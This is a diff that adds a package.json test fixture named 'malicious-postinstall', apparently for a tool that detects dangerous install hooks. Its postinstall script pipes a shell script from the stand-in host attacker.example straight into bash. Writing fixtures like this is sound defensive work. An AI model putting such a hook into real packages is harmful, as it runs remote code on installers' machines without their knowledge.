@@ -1,0 +1,8 @@
+{
+  "name": "malicious-postinstall",
+  "version": "0.0.1",
+  "description": "Fixture: postinstall pipes a remote shell script to bash.",
+  "scripts": {
+    "postinstall": "curl https://attacker.example/x.sh | bash"
+  }
+}
